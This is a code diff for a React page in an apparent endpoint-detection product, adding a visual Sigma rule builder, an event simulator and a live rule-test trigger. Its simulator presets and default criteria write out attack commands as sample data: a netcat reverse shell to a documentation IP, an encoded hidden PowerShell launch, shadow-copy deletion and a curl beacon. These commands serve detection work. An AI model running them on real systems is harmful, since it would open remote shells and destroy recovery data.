@@ -1,6 +1,6 @@
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { useEffect, useRef, useState } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useSearchParams, Link } from "react-router-dom";
 import CoveragePage from "./coverage";
 import { Icon } from "../components/Icon";
 import { PageHeader, Panel } from "../components/ui";
@@ -33,9 +33,11 @@ import {
   deleteCustomSigmaRule,
   backtestCustomRule,
   getSigmaBundleExport,
+  simulateCustomRule,
+  triggerLiveRuleTest,
 } from "../lib/api";
 import { clearEnumDrafts, clearLogDrafts, clearYaraDraft, readEnumDrafts, readLogDrafts, readYaraDraft, writeEnumDrafts, writeLogDrafts, writeYaraDraft } from "./rulesDrafts";
-import type { CustomYaraRule, EnumPatternRow, FpDayPoint, LogPatternKind, RuleBacktestResult, RuleFpEntry, RulePack, TuningKnob, YaraTestResponse } from "../types";
+import type { CustomYaraRule, EnumPatternRow, FpDayPoint, LogPatternKind, RuleBacktestResult, RuleFpEntry, RulePack, TuningKnob, YaraTestResponse, RuleSimulationResult, RuleTriggerTestResult } from "../types";
 
 const PLATFORM_LABELS: Record<string, string> = {
   windows: "Windows",
@@ -964,6 +966,45 @@ function SigmaDetectionStudio({
   const [showCatalog, setShowCatalog] = useState(false);
   const [actionNotice, setActionNotice] = useState<string | null>(null);
 
+  // Authoring Mode: Visual Rule Builder vs Raw Sigma YAML Editor
+  const [authorMode, setAuthorMode] = useState<"builder" | "yaml">("builder");
+
+  // Visual Rule Builder State
+  const [builderTitle, setBuilderTitle] = useState("Custom Suspicious Tool Execution");
+  const [builderDesc, setBuilderDesc] = useState("Detects suspicious process execution patterns and commands");
+  const [builderLevel, setBuilderLevel] = useState("high");
+  const [builderPlatform, setBuilderPlatform] = useState("linux");
+  const [builderCategory, setBuilderCategory] = useState("process_creation");
+  const [builderTactic, setBuilderTactic] = useState("execution");
+  const [builderTechnique, setBuilderTechnique] = useState("T1059");
+  const [builderCriteria, setBuilderCriteria] = useState<Array<{ field: string; modifier: string; value: string }>>([
+    { field: "CommandLine", modifier: "contains", value: "nc -e, netcat -e, /bin/bash -i" },
+  ]);
+  const [builderExclusions, setBuilderExclusions] = useState<Array<{ field: string; modifier: string; value: string }>>([
+    { field: "CommandLine", modifier: "contains", value: "benign_healthcheck" },
+  ]);
+
+  // Validation Console State: Simulator vs Historical Backtest
+  const [validationTab, setValidationTab] = useState<"simulator" | "backtest">("simulator");
+
+  // Telemetry Simulator State
+  const [simEvent, setSimEvent] = useState({
+    process_name: "nc",
+    command_line: "nc -e /bin/bash 198.51.100.25 4444",
+    dest_ip: "198.51.100.25",
+    dest_port: "4444",
+    file_path: "",
+    user: "root",
+    platform: "linux",
+  });
+  const [simResult, setSimResult] = useState<RuleSimulationResult | null>(null);
+  const [simRunning, setSimRunning] = useState(false);
+  const [simError, setSimError] = useState<string | null>(null);
+
+  const [triggerRunning, setTriggerRunning] = useState(false);
+  const [triggerResult, setTriggerResult] = useState<RuleTriggerTestResult | null>(null);
+  const [triggerError, setTriggerError] = useState<string | null>(null);
+
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
       if (e.key === "Escape") setShowCatalog(false);
@@ -1025,10 +1066,67 @@ function SigmaDetectionStudio({
       setYaml("");
       setResult(null);
       setBacktestResult(null);
+      setSimResult(null);
+      setTriggerResult(null);
       setActionNotice("Rule removed from engine registry");
       setTimeout(() => setActionNotice(null), 2500);
     },
   });
+
+  // Helper to compile Visual Builder into canonical Sigma YAML
+  const syncBuilderToYaml = (): string => {
+    const tags = [`attack.${builderTactic}`, `attack.${builderTechnique.toLowerCase().trim()}`];
+    const selection: Record<string, string[]> = {};
+    builderCriteria.forEach((c) => {
+      if (!c.field.trim() || !c.value.trim()) return;
+      const key = c.modifier && c.modifier !== "contains" ? `${c.field}|${c.modifier}` : c.field;
+      const vals = c.value.split(",").map((v) => v.trim()).filter(Boolean);
+      selection[key] = vals.length > 0 ? vals : [c.value.trim()];
+    });
+
+    const filter: Record<string, string[]> = {};
+    builderExclusions.forEach((c) => {
+      if (!c.field.trim() || !c.value.trim()) return;
+      const key = c.modifier && c.modifier !== "contains" ? `${c.field}|${c.modifier}` : c.field;
+      const vals = c.value.split(",").map((v) => v.trim()).filter(Boolean);
+      filter[key] = vals.length > 0 ? vals : [c.value.trim()];
+    });
+
+    const lines = [
+      `title: ${builderTitle || "Custom Detection Rule"}`,
+      `id: custom-${Date.now().toString(16)}`,
+      `status: experimental`,
+      `description: ${builderDesc || "Custom operator-authored detection rule"}`,
+      `level: ${builderLevel}`,
+      `tags:`,
+      ...tags.map((t) => `  - ${t}`),
+      `logsource:`,
+      builderPlatform !== "all" ? `  product: ${builderPlatform}` : null,
+      builderCategory ? `  category: ${builderCategory}` : null,
+      `detection:`,
+      `  selection:`,
+    ].filter(Boolean) as string[];
+
+    Object.entries(selection).forEach(([k, vals]) => {
+      lines.push(`    ${k}:`);
+      vals.forEach((v) => lines.push(`      - '${v}'`));
+    });
+
+    if (Object.keys(filter).length > 0) {
+      lines.push(`  filter:`);
+      Object.entries(filter).forEach(([k, vals]) => {
+        lines.push(`    ${k}:`);
+        vals.forEach((v) => lines.push(`      - '${v}'`));
+      });
+      lines.push(`  condition: selection and not filter`);
+    } else {
+      lines.push(`  condition: selection`);
+    }
+
+    const generated = lines.join("\n") + "\n";
+    setYaml(generated);
+    return generated;
+  };
 
   // Auto-initialize when redirected from MITRE coverage gap or deep-linked rule_id
   useEffect(() => {
@@ -1046,6 +1144,8 @@ function SigmaDetectionStudio({
 
     if (searchParams.get("create") === "1" && tacticParam && !yaml) {
       const sanitized = tacticParam.toLowerCase().replace(/[^a-z0-9]+/g, "_");
+      setBuilderTactic(sanitized);
+      setBuilderTitle(`Custom Rule for ${tacticParam}`);
       setYaml(`title: Custom Rule for ${tacticParam}
 id: e2b08fa1-custom-${Date.now().toString(16)}
 status: experimental
@@ -1060,7 +1160,6 @@ detection:
   condition: selection
 `);
     } else if (!yaml && customRules && customRules.length > 0 && !selectedRuleId) {
-      // Auto-load first rule by default
       const first = customRules[0];
       setSelectedRuleId(first.rule_id);
       if (first.sigma_yaml) setYaml(first.sigma_yaml);
@@ -1071,7 +1170,15 @@ detection:
     setSelectedRuleId(null);
     setResult(null);
     setBacktestResult(null);
+    setSimResult(null);
+    setTriggerResult(null);
     if (type === "linux") {
+      setBuilderTitle("Linux Base64 Pipe Execution");
+      setBuilderLevel("high");
+      setBuilderPlatform("linux");
+      setBuilderTactic("execution");
+      setBuilderTechnique("T1059.004");
+      setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "base64 -d | sh, base64 -d | bash" }]);
       setYaml(`title: Linux Base64 Pipe Execution
 id: e2b08fa1-0002-4000-8000-000000000002
 status: experimental
@@ -1089,6 +1196,12 @@ detection:
   condition: selection
 `);
     } else if (type === "macos") {
+      setBuilderTitle("macOS LaunchDaemon Persistence");
+      setBuilderLevel("medium");
+      setBuilderPlatform("macos");
+      setBuilderTactic("persistence");
+      setBuilderTechnique("T1543.001");
+      setBuilderCriteria([{ field: "TargetFilename", modifier: "startswith", value: "/Library/LaunchDaemons/, /Library/LaunchAgents/" }]);
       setYaml(`title: macOS LaunchDaemon Persistence
 id: e2b08fa1-0003-4000-8000-000000000003
 status: experimental
@@ -1105,6 +1218,12 @@ detection:
   condition: selection
 `);
     } else if (type === "c2") {
+      setBuilderTitle("Direct External IP Socket Connection");
+      setBuilderLevel("high");
+      setBuilderPlatform("all");
+      setBuilderTactic("command_and_control");
+      setBuilderTechnique("T1071");
+      setBuilderCriteria([{ field: "DestinationIp", modifier: "contains", value: "198.51.100., 203.0.113." }]);
       setYaml(`title: Direct External IP Socket Connection
 id: e2b08fa1-0004-4000-8000-000000000004
 status: experimental
@@ -1121,6 +1240,12 @@ detection:
   condition: selection
 `);
     } else if (type === "ransomware") {
+      setBuilderTitle("Ransomware Shadow Copy Invalidation");
+      setBuilderLevel("critical");
+      setBuilderPlatform("windows");
+      setBuilderTactic("impact");
+      setBuilderTechnique("T1490");
+      setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "vssadmin delete shadows, shadowcopy delete" }]);
       setYaml(`title: Ransomware Shadow Copy Invalidation
 id: e2b08fa1-0005-4000-8000-000000000005
 status: experimental
@@ -1138,6 +1263,15 @@ detection:
   condition: selection
 `);
     } else {
+      setBuilderTitle("Suspicious PowerShell Download C2");
+      setBuilderLevel("high");
+      setBuilderPlatform("windows");
+      setBuilderTactic("execution");
+      setBuilderTechnique("T1059.001");
+      setBuilderCriteria([
+        { field: "Image", modifier: "endswith", value: "powershell.exe" },
+        { field: "CommandLine", modifier: "contains", value: "DownloadFile, DownloadString, IEX" },
+      ]);
       setYaml(`title: Suspicious PowerShell Download C2
 id: e2b08fa1-1234-5678-abcd-000000000000
 status: experimental
@@ -1160,12 +1294,13 @@ detection:
   };
 
   const handleTranspile = async () => {
-    if (!yaml.trim()) return;
+    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
+    if (!activeYaml.trim()) return;
     setError(null);
     setResult(null);
     setBusy(true);
     try {
-      const res = await transpileSigmaRule(yaml);
+      const res = await transpileSigmaRule(activeYaml);
       setResult(res);
     } catch (e: any) {
       setError(e?.message || "Transpilation failed");
@@ -1174,26 +1309,139 @@ detection:
     }
   };
 
+  const handleDeploy = () => {
+    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
+    if (!activeYaml.trim()) return;
+    importMutation.mutate(activeYaml);
+  };
+
   const handleSelectCommunityRule = (r: any) => {
     setSelectedRuleId(null);
     setYaml(r.sigma_yaml);
+    setAuthorMode("yaml");
     setShowCatalog(false);
     setError(null);
     setResult(null);
     setBacktestResult(null);
+    setSimResult(null);
+    setTriggerResult(null);
   };
 
   const handleRunInlineBacktest = async () => {
-    if (!yaml.trim()) return;
+    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
+    if (!activeYaml.trim()) return;
     setBacktestRunning(true);
     setBacktestError(null);
     try {
-      const res = await backtestCustomRule({ sigma_yaml: yaml, max_events: backtestWindow });
+      const res = await backtestCustomRule({ sigma_yaml: activeYaml, max_events: backtestWindow });
       setBacktestResult(res);
     } catch (err: any) {
       setBacktestError(err?.message || "Historical backtest query failed");
     } finally {
       setBacktestRunning(false);
+    }
+  };
+
+  const handleRunSimulation = async () => {
+    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
+    if (!activeYaml.trim()) return;
+    setSimRunning(true);
+    setSimError(null);
+    setSimResult(null);
+    try {
+      const res = await simulateCustomRule({
+        sigma_yaml: activeYaml,
+        event: {
+          ...simEvent,
+          dest_port: simEvent.dest_port ? Number(simEvent.dest_port) : undefined,
+        },
+      });
+      setSimResult(res);
+    } catch (err: any) {
+      setSimError(err?.message || "Simulation evaluation failed");
+    } finally {
+      setSimRunning(false);
+    }
+  };
+
+  const handleFireLiveTest = async () => {
+    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
+    if (!activeYaml.trim()) return;
+    setTriggerRunning(true);
+    setTriggerError(null);
+    setTriggerResult(null);
+    try {
+      const res = await triggerLiveRuleTest({
+        sigma_yaml: activeYaml,
+        event: {
+          ...simEvent,
+          dest_port: simEvent.dest_port ? Number(simEvent.dest_port) : undefined,
+        },
+        sample_name: builderTitle || "rule_verification_test",
+      });
+      setTriggerResult(res);
+      setActionNotice(`Live test fired! Alert #${res.alert_id ?? "live"} registered.`);
+      void refetchCustom();
+    } catch (err: any) {
+      setTriggerError(err?.message || "Live test trigger failed");
+    } finally {
+      setTriggerRunning(false);
+    }
+  };
+
+  const loadSimPreset = (preset: "netcat" | "powershell" | "shadows" | "c2" | "benign") => {
+    setSimResult(null);
+    setTriggerResult(null);
+    if (preset === "netcat") {
+      setSimEvent({
+        process_name: "nc",
+        command_line: "nc -e /bin/bash 198.51.100.25 4444",
+        dest_ip: "198.51.100.25",
+        dest_port: "4444",
+        file_path: "",
+        user: "root",
+        platform: "linux",
+      });
+    } else if (preset === "powershell") {
+      setSimEvent({
+        process_name: "powershell.exe",
+        command_line: "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+        dest_ip: "198.51.100.77",
+        dest_port: "443",
+        file_path: "",
+        user: "SYSTEM",
+        platform: "windows",
+      });
+    } else if (preset === "shadows") {
+      setSimEvent({
+        process_name: "vssadmin.exe",
+        command_line: "vssadmin delete shadows /all /quiet",
+        dest_ip: "",
+        dest_port: "",
+        file_path: "C:\\Windows\\System32\\vssadmin.exe",
+        user: "Administrator",
+        platform: "windows",
+      });
+    } else if (preset === "c2") {
+      setSimEvent({
+        process_name: "curl",
+        command_line: "curl http://198.51.100.44:4444/beacon -o /dev/null",
+        dest_ip: "198.51.100.44",
+        dest_port: "4444",
+        file_path: "",
+        user: "www-data",
+        platform: "linux",
+      });
+    } else {
+      setSimEvent({
+        process_name: "ping",
+        command_line: "ping -c 4 8.8.8.8",
+        dest_ip: "8.8.8.8",
+        dest_port: "",
+        file_path: "/bin/ping",
+        user: "operator",
+        platform: "linux",
+      });
     }
   };
 
@@ -1318,7 +1566,11 @@ detection:
               <button
                 onClick={() => {
                   setSelectedRuleId(null);
-                  loadExample("windows");
+                  setAuthorMode("builder");
+                  setBuilderTitle("New Detection Rule");
+                  setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "" }]);
+                  setBuilderExclusions([]);
+                  loadExample("linux");
                 }}
                 className="press rounded border border-accent/50 bg-accent/15 px-2 py-0.5 text-[10px] font-bold text-accent hover:bg-accent/25"
                 title="Author a new custom Sigma rule from scratch"
@@ -1392,8 +1644,11 @@ detection:
                     onClick={() => {
                       setSelectedRuleId(rule.rule_id);
                       if (rule.sigma_yaml) setYaml(rule.sigma_yaml);
+                      setAuthorMode("yaml");
                       setResult(null);
                       setBacktestResult(null);
+                      setSimResult(null);
+                      setTriggerResult(null);
                     }}
                     className={`cursor-pointer rounded-lg p-2.5 transition pt-2 ${
                       isSelected
@@ -1460,31 +1715,50 @@ detection:
           </div>
         </div>
 
-        {/* Right Column: Detection IDE & Live Backtester (8 cols) */}
+        {/* Right Column: Detection IDE & Validation Studio (8 cols) */}
         <div className="lg:col-span-8 space-y-4">
-          {/* IDE Container */}
+          {/* Main Authoring Deck */}
           <div className="rounded-xl border border-border-subtle bg-bg-surface overflow-hidden shadow-xs">
-            {/* IDE Toolbar */}
+            {/* Toolbar Header */}
             <div className="border-b border-border-subtle bg-bg-elevated/40 p-3 flex flex-wrap items-center justify-between gap-2.5">
-              <div className="flex items-center gap-2">
-                <span className="font-bold text-text-primary text-xs">
-                  {activeRule ? activeRule.title : "New Detection Rule Draft"}
-                </span>
-                {activeRule && (
+              <div className="flex items-center gap-3">
+                {/* Authoring Mode Switcher */}
+                <div className="flex items-center rounded-lg border border-border-subtle bg-bg-base p-0.5">
                   <button
-                    onClick={() => toggleMutation.mutate({ ruleId: activeRule.rule_id, enabled: !activeRule.enabled })}
-                    className={`press rounded border px-1.5 py-0.5 text-[10px] font-bold ${
-                      activeRule.enabled
-                        ? "border-signal/50 bg-signal/15 text-signal"
-                        : "border-border-subtle bg-bg-base text-text-muted"
+                    type="button"
+                    onClick={() => setAuthorMode("builder")}
+                    className={`press rounded px-2.5 py-1 text-[11px] font-bold transition flex items-center gap-1.5 ${
+                      authorMode === "builder"
+                        ? "bg-accent/20 border border-accent/60 text-accent shadow-xs"
+                        : "text-text-muted hover:text-text-primary"
                     }`}
                   >
-                    {activeRule.enabled ? "Active" : "Disabled"}
+                    <Icon name="sliders" size={11} />
+                    <span>Visual Rule Builder</span>
                   </button>
-                )}
+                  <button
+                    type="button"
+                    onClick={() => {
+                      if (authorMode === "builder") syncBuilderToYaml();
+                      setAuthorMode("yaml");
+                    }}
+                    className={`press rounded px-2.5 py-1 text-[11px] font-bold transition flex items-center gap-1.5 ${
+                      authorMode === "yaml"
+                        ? "bg-accent/20 border border-accent/60 text-accent shadow-xs"
+                        : "text-text-muted hover:text-text-primary"
+                    }`}
+                  >
+                    <Icon name="terminal" size={11} />
+                    <span>Sigma YAML Code</span>
+                  </button>
+                </div>
+
+                <span className="font-bold text-text-primary text-xs truncate max-w-xs">
+                  {authorMode === "builder" ? builderTitle : activeRule ? activeRule.title : "Custom Detection Rule Draft"}
+                </span>
               </div>
 
-              {/* Quick Template Presets */}
+              {/* Template Presets Bar */}
               <div className="flex flex-wrap items-center gap-1 text-[10px]">
                 <span className="text-text-faint uppercase mr-1">Presets:</span>
                 <button
@@ -1520,211 +1794,810 @@ detection:
               </div>
             </div>
 
-            {/* Code Editor Surface */}
-            <div className="p-3 bg-bg-base">
-              <textarea
-                rows={11}
-                spellCheck={false}
-                value={yaml}
-                onChange={(e) => setYaml(e.target.value)}
-                placeholder="Author Sigma YAML detection rule (selection criteria, modifiers, MITRE tags)..."
-                className="w-full rounded-lg border border-border-subtle/80 bg-bg-surface p-3 font-mono text-xs text-text-primary placeholder:text-text-faint focus:border-accent/70 focus:outline-none leading-relaxed resize-y"
-              />
-
-              {/* IDE Action Ribbon */}
-              <div className="mt-2.5 flex flex-wrap items-center justify-between gap-2">
-                <div className="flex flex-wrap items-center gap-2">
-                  <button
-                    onClick={handleTranspile}
-                    disabled={busy || !yaml.trim()}
-                    className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/10 px-3 py-1.5 font-semibold text-accent hover:bg-accent/20 disabled:opacity-50"
-                  >
-                    <Icon name="terminal" size={12} />
-                    <span>{busy ? "Validating…" : "Transpile & Validate"}</span>
-                  </button>
-
-                  <button
-                    onClick={() => importMutation.mutate(yaml)}
-                    disabled={importMutation.isPending || !yaml.trim()}
-                    className="press inline-flex items-center gap-1 rounded-md border border-signal/60 bg-signal/15 px-3 py-1.5 font-bold text-signal hover:bg-signal/25 disabled:opacity-50"
-                  >
-                    <Icon name="check" size={12} />
-                    <span>{importMutation.isPending ? "Deploying…" : imported ? "✓ Deployed" : "Deploy into Engine"}</span>
-                  </button>
-
-                  <button
-                    onClick={handleRunInlineBacktest}
-                    disabled={backtestRunning || !yaml.trim()}
-                    className="press inline-flex items-center gap-1 rounded-md border border-accent/70 bg-accent/20 px-3 py-1.5 font-bold text-accent hover:bg-accent/30 disabled:opacity-50"
-                  >
-                    <Icon name="play" size={12} />
-                    <span>Backtest on History</span>
-                  </button>
-                </div>
-
-                {result && (
-                  <span className="text-risk-clean font-semibold text-[11px]">
-                    ✓ Transpiled {result.transpiled_filter_count} criteria
-                  </span>
-                )}
-              </div>
-
-              {error && <p className="mt-2 text-risk-malicious text-[11px] font-semibold">{error}</p>}
-
-              {/* Transpiled AST Feedback Strip */}
-              {result && (
-                <div className="mt-3 rounded-lg border border-border-subtle bg-bg-surface p-3 space-y-2">
-                  <div className="flex flex-wrap items-center justify-between gap-2 text-[11px]">
-                    <span className="font-bold text-text-primary">{result.title}</span>
-                    <div className="flex items-center gap-1 text-[10px]">
-                      <span className="rounded bg-accent/15 px-1.5 py-0.2 text-accent">{result.rule_id}</span>
-                      <span className="rounded bg-risk-malicious/15 px-1.5 py-0.2 text-risk-malicious font-bold uppercase">{result.severity}</span>
+            {/* Mode 1: Visual Rule Builder */}
+            {authorMode === "builder" ? (
+              <div className="p-4 bg-bg-base space-y-4">
+                {/* Metadata Fields */}
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Rule Title</label>
+                    <input
+                      type="text"
+                      value={builderTitle}
+                      onChange={(e) => setBuilderTitle(e.target.value)}
+                      placeholder="e.g. Suspicious Netcat Reverse Shell"
+                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Severity Level</label>
+                    <div className="grid grid-cols-4 gap-1.5">
+                      {(["critical", "high", "medium", "low"] as const).map((sev) => (
+                        <button
+                          key={sev}
+                          type="button"
+                          onClick={() => setBuilderLevel(sev)}
+                          className={`rounded border py-1 text-[10px] font-bold uppercase transition ${
+                            builderLevel === sev
+                              ? sev === "critical"
+                                ? "border-risk-malicious bg-risk-malicious/20 text-risk-malicious"
+                                : sev === "high"
+                                ? "border-risk-suspicious bg-risk-suspicious/20 text-risk-suspicious"
+                                : "border-accent bg-accent/20 text-accent"
+                              : "border-border-subtle bg-bg-surface text-text-faint hover:text-text-primary"
+                          }`}
+                        >
+                          {sev}
+                        </button>
+                      ))}
                     </div>
                   </div>
-                  <div className="flex flex-wrap gap-1">
-                    {result.mitre_tactics.map((t: string) => (
-                      <span key={t} className="rounded bg-bg-base border border-border-subtle px-1.5 py-0.2 text-[10px] text-text-muted">
-                        {t}
-                      </span>
-                    ))}
-                    {result.mitre_techniques.map((t: string) => (
-                      <span key={t} className="rounded bg-accent/10 px-1.5 py-0.2 text-[10px] text-accent">
-                        {t}
-                      </span>
-                    ))}
+                </div>
+
+                <div>
+                  <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Rule Description & Threat Rationale</label>
+                  <input
+                    type="text"
+                    value={builderDesc}
+                    onChange={(e) => setBuilderDesc(e.target.value)}
+                    placeholder="Describe what this rule detects and the threat context..."
+                    className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                  />
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Target Platform</label>
+                    <select
+                      value={builderPlatform}
+                      onChange={(e) => setBuilderPlatform(e.target.value)}
+                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                    >
+                      <option value="all">All Operating Systems</option>
+                      <option value="linux">Linux (eBPF / trace)</option>
+                      <option value="windows">Windows (Sysmon / EVTX)</option>
+                      <option value="macos">macOS (EndpointSecurity)</option>
+                    </select>
                   </div>
-                  <div className="mt-1 space-y-1 text-[10px]">
-                    {result.criteria.map((c: any, i: number) => (
-                      <div key={i} className="flex items-center gap-1.5 rounded bg-bg-base/70 px-2 py-0.5">
-                        <span className="text-accent">{c.target_field}</span>
-                        <span className="text-text-faint">{c.modifier}</span>
-                        <span className="text-risk-clean">&quot;{c.value}&quot;</span>
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Telemetry Category</label>
+                    <select
+                      value={builderCategory}
+                      onChange={(e) => setBuilderCategory(e.target.value)}
+                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                    >
+                      <option value="process_creation">Process Creation</option>
+                      <option value="network_traffic">Network Traffic / Sockets</option>
+                      <option value="file_change">File Modification</option>
+                      <option value="registry_set">Registry Set</option>
+                    </select>
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">MITRE Tactic</label>
+                    <select
+                      value={builderTactic}
+                      onChange={(e) => setBuilderTactic(e.target.value)}
+                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                    >
+                      <option value="execution">Execution</option>
+                      <option value="persistence">Persistence</option>
+                      <option value="defense_evasion">Defense Evasion</option>
+                      <option value="command_and_control">Command and Control</option>
+                      <option value="credential_access">Credential Access</option>
+                      <option value="privilege_escalation">Privilege Escalation</option>
+                      <option value="impact">Impact</option>
+                    </select>
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">MITRE Technique</label>
+                    <input
+                      type="text"
+                      value={builderTechnique}
+                      onChange={(e) => setBuilderTechnique(e.target.value)}
+                      placeholder="e.g. T1059.004"
+                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
+                    />
+                  </div>
+                </div>
+
+                {/* Selection Criteria Rows */}
+                <div className="space-y-2 rounded-lg border border-border-subtle bg-bg-surface/50 p-3">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <span className="font-bold text-xs text-text-primary">Detection Selection Criteria</span>
+                      <p className="text-[10px] text-text-muted">Define the specific process, command line, or network targets to trigger on</p>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => setBuilderCriteria([...builderCriteria, { field: "CommandLine", modifier: "contains", value: "" }])}
+                      className="press rounded border border-accent/50 bg-accent/15 px-2 py-0.5 text-[10px] font-bold text-accent hover:bg-accent/25"
+                    >
+                      + Add Criterion
+                    </button>
+                  </div>
+
+                  <div className="space-y-1.5 mt-2">
+                    {builderCriteria.map((c, i) => (
+                      <div key={i} className="flex items-center gap-2">
+                        <select
+                          value={c.field}
+                          onChange={(e) => {
+                            const next = [...builderCriteria];
+                            next[i].field = e.target.value;
+                            setBuilderCriteria(next);
+                          }}
+                          className="w-36 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                        >
+                          <option value="CommandLine">CommandLine</option>
+                          <option value="Image">Process Name (Image)</option>
+                          <option value="ParentImage">Parent Process</option>
+                          <option value="DestinationIp">Destination IP</option>
+                          <option value="DestinationPort">Destination Port</option>
+                          <option value="TargetFilename">Target File Path</option>
+                          <option value="TargetObject">Registry Key</option>
+                          <option value="User">User Account</option>
+                        </select>
+
+                        <select
+                          value={c.modifier}
+                          onChange={(e) => {
+                            const next = [...builderCriteria];
+                            next[i].modifier = e.target.value;
+                            setBuilderCriteria(next);
+                          }}
+                          className="w-28 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                        >
+                          <option value="contains">contains</option>
+                          <option value="startswith">startswith</option>
+                          <option value="endswith">endswith</option>
+                          <option value="equals">equals</option>
+                          <option value="regex">regex</option>
+                        </select>
+
+                        <input
+                          type="text"
+                          value={c.value}
+                          onChange={(e) => {
+                            const next = [...builderCriteria];
+                            next[i].value = e.target.value;
+                            setBuilderCriteria(next);
+                          }}
+                          placeholder="e.g. nc -e, /bin/sh (comma-separated for OR matching)"
+                          className="flex-1 rounded border border-border-subtle bg-bg-surface px-2.5 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                        />
+
+                        <button
+                          type="button"
+                          onClick={() => {
+                            if (builderCriteria.length > 1) {
+                              setBuilderCriteria(builderCriteria.filter((_, idx) => idx !== i));
+                            }
+                          }}
+                          disabled={builderCriteria.length <= 1}
+                          className="text-text-muted hover:text-risk-malicious p-1 disabled:opacity-30"
+                          title="Remove criterion"
+                        >
+                          ✕
+                        </button>
                       </div>
                     ))}
                   </div>
                 </div>
-              )}
-            </div>
-          </div>
 
-          {/* Integrated Historical Backtesting Console */}
-          <div className="rounded-xl border border-border-subtle bg-bg-surface p-4 space-y-3">
-            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-subtle/60 pb-2.5">
-              <div>
-                <span className="text-[10px] uppercase font-bold text-text-faint tracking-wider">
-                  Validation Engine
-                </span>
-                <h4 className="font-bold text-text-primary text-xs">
-                  Historical Event Store Backtest
-                </h4>
-              </div>
-
-              <div className="flex items-center gap-2">
-                <span className="text-text-faint text-[10px]">Window:</span>
-                <select
-                  value={backtestWindow}
-                  onChange={(e) => setBacktestWindow(Number(e.target.value))}
-                  disabled={backtestRunning}
-                  className="rounded border border-border-subtle bg-bg-base px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
-                >
-                  <option value={500}>500 Events</option>
-                  <option value={1000}>1,000 Events</option>
-                  <option value={2000}>2,000 Events</option>
-                  <option value={5000}>5,000 Events</option>
-                </select>
-
-                {onOpenBacktest && (
-                  <button
-                    onClick={() =>
-                      onOpenBacktest({
-                        id: activeRule?.rule_id,
-                        name: activeRule?.title || result?.title || "Custom Sigma Draft",
-                        customYaml: yaml,
-                      })
-                    }
-                    className="press inline-flex items-center gap-1 rounded-md border border-border-subtle bg-bg-base px-2 py-1 text-text-muted hover:border-accent/40 hover:text-text-primary"
-                    title="Open standalone backtest modal"
-                  >
-                    <span>Modal</span>
-                  </button>
-                )}
-
-                <button
-                  onClick={handleRunInlineBacktest}
-                  disabled={backtestRunning || !yaml.trim()}
-                  className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/15 px-2.5 py-1 font-semibold text-accent hover:bg-accent/25 disabled:opacity-50"
-                >
-                  <Icon name={backtestRunning ? "refresh" : "play"} size={11} className={backtestRunning ? "animate-spin" : ""} />
-                  <span>{backtestRunning ? "Scanning…" : "Execute Backtest"}</span>
-                </button>
-              </div>
-            </div>
-
-            {backtestError && (
-              <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2 text-risk-malicious text-[11px]">
-                {backtestError}
-              </p>
-            )}
-
-            {!backtestResult && !backtestRunning && (
-              <p className="py-6 text-center text-text-muted text-[11px]">
-                Run backtest to evaluate this rule against historical SQLite EDR event streams and verify false-positive risk.
-              </p>
-            )}
-
-            {backtestResult && (
-              <div className="space-y-3">
-                {/* Backtest HUD Strip */}
-                <div className="grid grid-cols-3 gap-2.5">
-                  <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
-                    <span className="text-[10px] text-text-faint uppercase">Events Evaluated</span>
-                    <p className="text-sm font-bold text-text-primary mt-0.5">{backtestResult.events_scanned.toLocaleString()}</p>
-                  </div>
-                  <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
-                    <span className="text-[10px] text-text-faint uppercase">Rule Trigger Hits</span>
-                    <p className="text-sm font-bold text-accent mt-0.5">
-                      {backtestResult.matches_count} ({backtestResult.match_rate_pct}%)
-                    </p>
